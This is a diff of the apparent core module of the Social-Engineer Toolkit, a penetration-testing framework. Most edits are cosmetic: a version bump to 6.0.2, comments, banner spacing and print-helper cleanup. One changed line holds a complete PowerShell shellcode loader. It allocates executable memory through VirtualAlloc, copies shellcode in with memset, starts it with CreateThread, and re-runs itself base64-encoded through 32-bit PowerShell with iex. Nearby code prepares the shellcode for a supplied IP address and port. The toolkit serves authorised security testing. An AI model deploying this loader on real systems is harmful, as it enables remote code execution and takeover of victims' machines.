@@ -24,6 +24,7 @@ try:
     from Crypto.Cipher import AES
 
 except ImportError:
+
     print "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications."
     pass
 
@@ -229,7 +230,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '6.0'
+    define_version = '6.0.2'
     return define_version
 
 class create_menu:
@@ -277,11 +278,13 @@ def meta_path():
     else: msf_path = msf_path + "/"
     trigger = 0
     if not os.path.isdir(msf_path):
+
                 # specific for kali linux
                 if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
                     msf_path = "/opt/metasploit/apps/pro/msf3/"
                     trigger = 1
-                # specific for backtrack5
+
+                # specific for backtrack5 and other backtrack versions
                 if os.path.isfile("/opt/framework3/msf3/msfconsole"):
                     msf_path = "/opt/framework3/msf3/"
                     trigger = 1
@@ -294,6 +297,7 @@ def meta_path():
                 if os.path.isfile("/usr/bin/msfconsole"):
                     msf_path = ""
                     trigger = 1
+
                 # specific for pwnpad and pwnplug (pwnie express)
                 if os.path.isfile("/opt/metasploit-framework/msfconsole"):
                     msf_path = "/opt/metasploit-framework"
@@ -307,6 +311,8 @@ def meta_path():
                             print_error("Please configure in the config/set_config.")
                             return_continue()
                             return False
+
+                    # if we are using windows
                     if check_os() == "windows":
                         print_warning("Metasploit payloads are not currently supported. This is coming soon.")
                         msf_path = ""
@@ -425,6 +431,8 @@ def bleeding_edge():
             print_status("Bleeding edge already active..Moving on..")
             subprocess.Popen("apt-get update;apt-get upgrade -f -y --force-yes;apt-get dist-upgrade -f -y --force-yes;apt-get autoremove -f -y --force-yes", shell=True).wait()
             return True
+
+        # else lets add them if they want
         else:
             print_status("Adding Kali bleeding edge to sources.list for updates.")
             # we need to add repo to kali file
@@ -451,6 +459,7 @@ def update_set():
         time.sleep(2)
         bleeding_edge()
 
+    # if we aren't running Kali :( 
     else:
         peinr_info("Kali-Linux not detected, manually updating..")
         print_info("Updating the Social-Engineer Toolkit, be patient...")
@@ -792,7 +801,7 @@ def show_banner(define_version,graphic):
     print bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
-[---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                     [---]
+[---]                Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
 [---]             Codename: '""" + bcolors.YELLOW + """Rebellion""" + bcolors.BLUE + """'                [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
@@ -1245,8 +1254,10 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
     # heres our shellcode prepped and ready to go
     shellcode = newdata[:-1]
+
     # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
-    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))	
+    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))
+
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le'))
 
@@ -1261,7 +1272,6 @@ def generate_shellcode(payload,ipaddr,port):
     repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
     data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
     # return data
-    print data
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
@@ -1602,18 +1612,18 @@ def bleeding_edge():
     # first check if we are actually using Kali
     kali = check_kali()
     if kali == "Kali":
-        print "[*] Checking to see if bleeding-edge repos are active."
+        print_status("Checking to see if bleeding-edge repos are active.")
         # check if we have the repos enabled first
         fileopen = file("/etc/apt/sources.list", "r")
         kalidata = fileopen.read()
         if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
-            print "[*] Bleeding edge already active..Moving on.."
+            print_status("Bleeding edge already active..Moving on..")
             return True
         else:
-            print "[!] Bleeding edge repos were not detected. This is recommended."
+            print_warning("Bleeding edge repos were not detected. This is recommended.")
             enable = raw_input("Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
             if enable == "y" or enable == "yes":
-                print "[*] Adding Kali bleeding edge to sources.list for updates."
+                print_status("Adding Kali bleeding edge to sources.list for updates.")
                 # we need to add repo to kali file
                 # we will rewrite the entire apt in case not all repos are there
                 filewrite = file("/etc/apt/sources.list", "w")
